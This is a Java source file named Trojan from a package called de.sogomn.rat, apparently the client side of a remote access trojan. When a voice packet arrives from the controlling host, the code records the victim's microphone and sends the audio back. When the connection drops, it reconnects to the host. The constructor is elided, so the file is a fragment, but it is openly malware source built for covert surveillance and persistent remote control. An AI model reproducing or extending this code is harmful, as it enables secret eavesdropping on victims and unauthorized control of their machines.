package de.sogomn.rat;

import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.VoicePacket;

public final class Trojan implements IClientObserver {
	
	private static final int MICROPHONE_BUFFER_SIZE = 1024 << 8;
	
	public Trojan() {
		//...
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		if (packet instanceof VoicePacket) {
			final VoiceRecorder recorder = new VoiceRecorder();
			final VoicePacket voice = (VoicePacket)packet;
			
			recorder.setMaximum(MICROPHONE_BUFFER_SIZE);
			recorder.addListener((source, data) -> {
				voice.setData(data);
				
				packet.execute(client);
			});
			recorder.start();
		} else {
			packet.execute(client);
		}
	}
	
	@Override
	public void clientDisconnected(final ActiveClient client) {
		final String address = client.getAddress();
		final int port = client.getPort();
		
		client.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
